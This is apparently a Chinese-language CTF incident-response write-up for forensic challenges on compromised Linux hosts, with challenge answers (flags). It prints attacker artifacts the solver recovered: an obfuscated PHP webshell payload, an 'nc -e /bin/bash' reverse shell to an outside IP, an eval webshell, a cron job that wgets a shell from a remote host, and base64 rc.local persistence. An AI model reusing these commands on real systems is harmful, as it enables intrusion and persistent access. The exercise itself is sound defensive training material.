<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>);@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<span class="hljs-variable">$opdir</span>=@<span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&quot;open_basedir&quot;</span>);<span class="hljs-keyword">if</span>(<span class="hljs-variable">$opdir</span>) &#123;<span class="hljs-variable">$ocwd</span>=<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="hljs-variable">$oparr</span>=<span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-string">&quot;Lzt8Oi8=&quot;</span>),<span class="hljs-variable">$opdir</span>);@<span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$oparr</span>,<span class="hljs-variable">$ocwd</span>,<span class="hljs-title function_ invoke__">sys_get_temp_dir</span>());<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$oparr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;<span class="hljs-keyword">if</span>(!@<span class="hljs-title function_ invoke__">is_writable</span>(<span class="hljs-variable">$item</span>))&#123;<span class="hljs-keyword">continue</span>;&#125;;<span class="hljs-variable">$tmdir</span>=<span class="hljs-variable">$item</span>.<span class="hljs-string">&quot;/.db70736&quot;</span>;@<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$tmdir</span>);<span class="hljs-keyword">if</span>(!@<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$tmdir</span>))&#123;<span class="hljs-keyword">continue</span>;&#125;<span class="hljs-variable">$tmdir</span>=<span class="hljs-title function_ invoke__">realpath</span>(<span class="hljs-variable">$tmdir</span>);@<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$tmdir</span>);@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;open_basedir&quot;</span>, <span class="hljs-string">&quot;..&quot;</span>);<span class="hljs-variable">$cntarr</span>=@<span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-string">&quot;/\\\\|\//&quot;</span>,<span class="hljs-variable">$tmdir</span>);<span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$cntarr</span>);<span class="hljs-variable">$i</span>++)&#123;@<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);&#125;;@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;open_basedir&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>);@<span class="hljs-title function_ invoke__">rmdir</span>(<span class="hljs-variable">$tmdir</span>);<span class="hljs-keyword">break</span>;&#125;;&#125;;;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">asenc</span>(<span class="hljs-params"><span class="hljs-variable">$out</span></span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;&#125;;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">asoutput</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-variable">$output</span>=<span class="hljs-title function_ invoke__">ob_get_contents</span>();<span class="hljs-title function_ invoke__">ob_end_clean</span>();<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;f57f16&quot;</span>.<span class="hljs-string">&quot;820073&quot;</span>;<span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">asenc</span>(<span class="hljs-variable">$output</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;7d8b2c&quot;</span>.<span class="hljs-string">&quot;f332af&quot;</span>;&#125;<span class="hljs-title function_ invoke__">ob_start</span>();<span class="hljs-keyword">try</span>&#123;<span class="hljs-variable">$D</span>=<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="hljs-keyword">if</span>(<span class="hljs-variable">$D</span>==<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-variable">$D</span>=<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;PATH_TRANSLATED&quot;</span>]);<span class="hljs-variable">$R</span>=<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$D&#125;</span>	&quot;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$D</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)!=<span class="hljs-string">&quot;/&quot;</span>)&#123;<span class="hljs-keyword">foreach</span>(<span class="hljs-title function_ invoke__">range</span>(<span class="hljs-string">&quot;C&quot;</span>,<span class="hljs-string">&quot;Z&quot;</span>)<span class="hljs-keyword">as</span> <span class="hljs-variable">$L</span>)<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$L&#125;</span>:&quot;</span>))<span class="hljs-variable">$R</span>.=<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$L&#125;</span>:&quot;</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-variable">$R</span>.=<span class="hljs-string">&quot;/&quot;</span>;&#125;<span class="hljs-variable">$R</span>.=<span class="hljs-string">&quot;	&quot;</span>;<span class="hljs-variable">$u</span>=(<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&quot;posix_getegid&quot;</span>))?@<span class="hljs-title function_ invoke__">posix_getpwuid</span>(@<span class="hljs-title function_ invoke__">posix_geteuid</span>()):<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-variable">$s</span>=(<span class="hljs-variable">$u</span>)?<span class="hljs-variable">$u</span>[<span class="hljs-string">&quot;name&quot;</span>]:@<span class="hljs-title function_ invoke__">get_current_user</span>();<span class="hljs-variable">$R</span>.=<span class="hljs-title function_ invoke__">php_uname</span>();<span class="hljs-variable">$R</span>.=<span class="hljs-string">&quot;	<span class="hljs-subst">&#123;$s&#125;</span>&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$R</span>;;&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ERROR://&quot;</span>.<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();&#125;;<span class="hljs-title function_ invoke__">asoutput</span>();<span class="hljs-keyword">die</span>();<br></code></pre></td></tr></table></figure>
<p><strong>目录遍历攻击</strong>：攻击者试图通过操作 <code>open_basedir</code> 来绕过目录限制，访问和写入本不允许访问的目录。</p>
<p><strong>临时文件创建</strong>：攻击者创建并删除临时目录 (<code>.db70736</code>)，试图利用这些目录进行恶意操作。</p>
<p><strong>信息泄露</strong>：代码会泄露服务器的详细信息（如文件系统路径、当前用户、操作系统等），这些信息可以帮助攻击者进一步渗透系统。</p>
<p><strong>代码混淆</strong>：通过将输出包裹在自定义的字符串中，以及使用 <code>asenc()</code> 空操作，试图隐藏恶意行为。</p>
<p>我随便取了一段长的主要应该都是讲base64混淆,先找了一个解码一下去头，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Y2QgIi8iO2NhdCAvZXRjL3JlZGlzLmNvbmY7ZWNobyAwY2EwNzY1ZTtwd2Q7ZWNobyAzNmE3MTQ=<br><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;/&quot;</span>;<span class="hljs-built_in">cat</span> /etc/redis.conf;<span class="hljs-built_in">echo</span> 0ca0765e;<span class="hljs-built_in">pwd</span>;<span class="hljs-built_in">echo</span> 36a714<br></code></pre></td></tr></table></figure>
<p>讲的应该是redis的主从然后传马，继续往下找</p>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-05214009.png" srcset="/img/loading.gif" lazyload alt="2025-03-05214009"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;/&quot;</span>;nc -e /bin/bash 192.168.150.199 4444;<span class="hljs-built_in">echo</span> 0ca0765e;<span class="hljs-built_in">pwd</span>;<span class="hljs-built_in">echo</span> 36a714<br></code></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.150.199:4444</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q4-18"><a class="markdownIt-Anchor" href="#q4-18"></a> Q4</h2>
<p>明显不应该出现的so</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-1:~# <span class="hljs-built_in">ls</span> /<br>bin       etc             lib     lost+found  opt          run   tmp      vmlinuz.old<br>boot      home            lib32   media       proc         sbin  usr<br>dev       initrd.img      lib64   mnt         result.pcap  srv   var<br>dump.rdb  initrd.img.old  libx32  module.so   root         sys   vmlinuz<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-1:~# <span class="hljs-built_in">md5sum</span> /module.so<br>d41d8cd98f00b204e9800998ecf8427e  /module.so<br></code></pre></td></tr></table></figure>
<h2 id="q5-14"><a class="markdownIt-Anchor" href="#q5-14"></a> Q5</h2>
<p>先看看马</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-1:~# find / -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;shell.php&quot;</span><br><br>root@ip-10-0-10-1:~# <br>root@ip-10-0-10-1:~# find / -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;.shell.php&quot;</span><br>/var/www/html/secret/.shell.php<br>root@ip-10-0-10-1:~# <span class="hljs-built_in">cat</span> /var/www/html/secret/.shell.php<br>&lt;?php <span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;password&quot;</span>])==<span class="hljs-string">&quot;accc9105df5383111407fd5b41255e23&quot;</span>)&#123;@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);&#125; ?&gt;<br>root@ip-10-0-10-1:~# crontab -l<br>no crontab <span class="hljs-keyword">for</span> root<br>root@ip-10-0-10-1:~# <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name command to be executed</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment">#</span><br><br>*/1 * * * * /usr/bin/wget http://192.168.150.199:88/shell.php -O /var/www/html/secret/.shell.php<br></code></pre></td></tr></table></figure>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//192.168.150.199:88/shell.php</span><br></code></pre></td></tr></table></figure>
<h1 id="linux后门应急"><a class="markdownIt-Anchor" href="#linux后门应急"></a> Linux后门应急</h1>
<h2 id="q1-22"><a class="markdownIt-Anchor" href="#q1-22"></a> Q1</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1、主机后门用户名称：提交格式如：flag&#123;backdoor&#125;<br></code></pre></td></tr></table></figure>
<p>直接看etc/passwd</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@ip-10-0-10-10:~$ <span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin<br>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>backdoor:x:0:0:root:/root:/bin/bash<br>user:x:1000:1000::/home/user:/bin/sh<br>debian:x:1001:1002:Debian:/home/debian:/bin/bash<br></code></pre></td></tr></table></figure>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;backdoor&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="q2-22"><a class="markdownIt-Anchor" href="#q2-22"></a> Q2</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">2、主机排查项中可以发现到flag&#123;&#125;内以i开头的flag，如flag&#123;ixxxxxxx&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@ip-10-0-10-10:~$ ps aux | grep <span class="hljs-string">&#x27;flag&#123;i&#x27;</span><br>root       498  0.0  0.0   2368  1712 ?        S    05:20   0:00 nc -lvp 9999 -c flag&#123;infoFl4g&#125;<br>user      1461  0.0  0.0   6204   876 pts/1    S+   05:25   0:00 grep flag&#123;i<br></code></pre></td></tr></table></figure>
<h2 id="q3-22"><a class="markdownIt-Anchor" href="#q3-22"></a> Q3</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">3、主机排查发现9999端口是通过哪个配置文件如何开机启动的，如/etc/crontab则填写/etc/crontab 的md5 ，提交方式示例：flag&#123;md5&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@ip-10-0-10-10:~$ <span class="hljs-built_in">sudo</span> netstat -tuln | grep 9999<br><span class="hljs-built_in">sudo</span>: unable to resolve host ip-10-0-10-10: Name or service not known<br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> user: <br>user is not <span class="hljs-keyword">in</span> the sudoers file.  This incident will be reported.<br></code></pre></td></tr></table></figure>
<p>看不了没权限</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs ruby">user<span class="hljs-variable">@ip</span>-<span class="hljs-number">10</span>-<span class="hljs-number">0</span>-<span class="hljs-number">10</span>-<span class="hljs-number">10</span><span class="hljs-symbol">:/etc/systemd/system</span><span class="hljs-variable">$ </span>ls<br>cloud-init.target.wants                 getty.target.wants           sshd.service<br>dbus-org.freedesktop.timesync1.service  multi-user.target.wants      sysinit.target.wants<br>docker-compose-app.service              network-online.target.wants  syslog.service<br>docker.service                          rc-local.service             timers.target.wants<br>user<span class="hljs-variable">@ip</span>-<span class="hljs-number">10</span>-<span class="hljs-number">0</span>-<span class="hljs-number">10</span>-<span class="hljs-number">10</span><span class="hljs-symbol">:/etc/systemd/system</span><span class="hljs-variable">$ </span>cat rc-local.service<br>[<span class="hljs-title class_">Unit</span>]<br><span class="hljs-title class_">Description</span>=<span class="hljs-regexp">/etc/rc</span>.local <span class="hljs-title class_">Compatibility</span><br><span class="hljs-title class_">ConditionPathExists</span>=<span class="hljs-regexp">/etc/rc</span>.d/rc.local<br><span class="hljs-title class_">After</span>=network.target<br><br>[<span class="hljs-title class_">Service</span>]<br><span class="hljs-title class_">Type</span>=forking<br><span class="hljs-title class_">ExecStart</span>=<span class="hljs-regexp">/etc/rc</span>.d/rc.local start<br><span class="hljs-title class_">TimeoutSec</span>=<span class="hljs-number">0</span><br><span class="hljs-title class_">RemainAfterExit</span>=yes<br><span class="hljs-title class_">SysVStartPriority</span>=<span class="hljs-number">99</span><br><br>[<span class="hljs-title class_">Install</span>]<br><span class="hljs-title class_">WantedBy</span>=multi-user.target<br>user<span class="hljs-variable">@ip</span>-<span class="hljs-number">10</span>-<span class="hljs-number">0</span>-<span class="hljs-number">10</span>-<span class="hljs-number">10</span><span class="hljs-symbol">:/etc/systemd/system</span><span class="hljs-variable">$ </span>md5sum /etc/rc.d/rc.local<br>41b84d57c502fb2a6fdf173a003d42ab  /etc/rc.d/rc.local<br>user<span class="hljs-variable">@ip</span>-<span class="hljs-number">10</span>-<span class="hljs-number">0</span>-<span class="hljs-number">10</span>-<span class="hljs-number">10</span><span class="hljs-symbol">:/etc/systemd/system</span><span class="hljs-variable">$ </span>cat /etc/rc.d/rc.local<br><span class="hljs-comment">#!/bin/bash</span><br><br>echo d2hpbGUgdHJ1ZTtkbyBub2h1cCBuYyAtbHZwIDk5OTkgLWMgImZsYWd7aW5mb0ZsNGd9IiAyPiYxIDtzbGVlcCAxO2RvbmU7 |<span class="hljs-params"> base64 -d </span>| nohup bash &amp;<br>exit <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
<p>里面是shell说明就是<code>/etc/rc.d/rc.local</code></p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">cf8a978fe83579e2e20ec<span class="hljs-number">158524d8c06</span><br></code></pre></td></tr></table></figure>
<h2 id="q4-19"><a class="markdownIt-Anchor" href="#q4-19"></a> Q4</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">4、黑客3s做了记录所有用户的每次登陆的密码的手段，flag为黑客记录的登陆密码日志路径md5,提交方式示例：flag&#123;md5(路径)&#125;<br></code></pre></td></tr></table></figure>
<p>考虑到会记录密码，而user的密码是已知的，可以搜索密码的位置</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> grep -nw <span class="hljs-string">&quot;Atmbctfer!&quot;</span> &#123;&#125; +<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@ip-10-0-10-10:~$ find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> grep -nw <span class="hljs-string">&quot;Atmbctfer!&quot;</span> &#123;&#125; +<br>find: ‘/root’: Permission denied<br>find: ‘/tmp/systemd-private-e9c3be86d5f24e96b25cee30996f5084-apache2.service-bnbsfB’: Permission denied<br>find: ‘/tmp/systemd-private-e9c3be86d5f24e96b25cee30996f5084-systemd-timesyncd.service-91IQBH’: Permission denied<br>find: ‘/run/containerd’: Permission denied<br>find: ‘/run/docker’: Permission denied<br>find: ‘/run/sudo’: Permission denied<br>find: ‘/run/log/journal/5ec1569a54db475f89e930b5454dc309’: Permission denied<br>find: ‘/run/systemd/unit-root’: Permission denied<br>find: ‘/run/systemd/inaccessible’: Permission denied<br>find: ‘/lost+found’: Permission denied<br>/tmp/.sshlog:1:user :Atmbctfer! <br>/tmp/.sshlog:2:user :Atmbctfer! <br>/tmp/.sshlog:3:user :Atmbctfer!<br></code></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">8997</span>d5a1b8dcca5a4be75962250959f7&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q5-15"><a class="markdownIt-Anchor" href="#q5-15"></a> Q5</h2>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">5</span>、给出使用了/bin/bash 的RCE后门进程名称+端口号 如进程名称为sshd，端口号为<span class="hljs-number">22</span>，则flag&#123;sshd22&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@ip-10-0-10-10:~$ netstat -anopt<br>(Not all processes could be identified, non-owned process info<br> will not be shown, you would have to be root to see it all.)<br>Active Internet connections (servers and established)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name     Timer<br>tcp        0      0 0.0.0.0:9294            0.0.0.0:*               LISTEN      -                    off (0.00/0/0)<br>tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN      -                    off (0.00/0/0)<br>tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      1283/python3         off (0.00/0/0)<br>tcp        0      0 0.0.0.0:81              0.0.0.0:*               LISTEN      -                    off (0.00/0/0)<br>tcp        0      0 0.0.0.0:8443            0.0.0.0:*               LISTEN      -                    off (0.00/0/0)<br>tcp        0      0 0.0.0.0:222             0.0.0.0:*               LISTEN      -                    off (0.00/0/0)<br>tcp        0      0 0.0.0.0:2823            0.0.0.0:*               LISTEN      -                    off (0.00/0/0)<br>tcp        0      0 10.0.10.10:222          58.218.234.99:4737      ESTABLISHED -                    keepalive (5542.96/0/0)<br>tcp6       0      0 :::9294                 :::*                    LISTEN      -                    off (0.00/0/0)<br>tcp6       0      0 :::80                   :::*                    LISTEN      -                    off (0.00/0/0)<br>tcp6       0      0 :::81                   :::*                    LISTEN      -                    off (0.00/0/0)<br>tcp6       0      0 :::8443                 :::*                    LISTEN      -                    off (0.00/0/0)<br>tcp6       0      0 :::222                  :::*                    LISTEN      -                    off (0.00/0/0)<br>tcp6       0      0 :::2823                 :::*                    LISTEN      -                    off (0.00/0/0)<br></code></pre></td></tr></table></figure>
<p>尝试nc连接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@ip-10-0-10-10:~$ nc 127.0.0.1 8080<br><span class="hljs-built_in">ls</span><br>nginx<br>Nomal.so<br><span class="hljs-built_in">ls</span> /<br>bin<br>boot<br>dev<br>etc<br>home<br>initrd.img<br>initrd.img.old<br>lib<br>lib32<br>lib64<br>libx32<br>lost+found<br>media<br>mnt<br>opt<br>proc<br>root<br>run<br>sbin<br>srv<br>sys<br>tmp<br>usr<br>var<br>vmlinuz<br>vmlinuz.old<br><span class="hljs-built_in">whoami</span><br>user<br><span class="hljs-built_in">pwd</span><br>/home/user<br></code></pre></td></tr></table></figure>
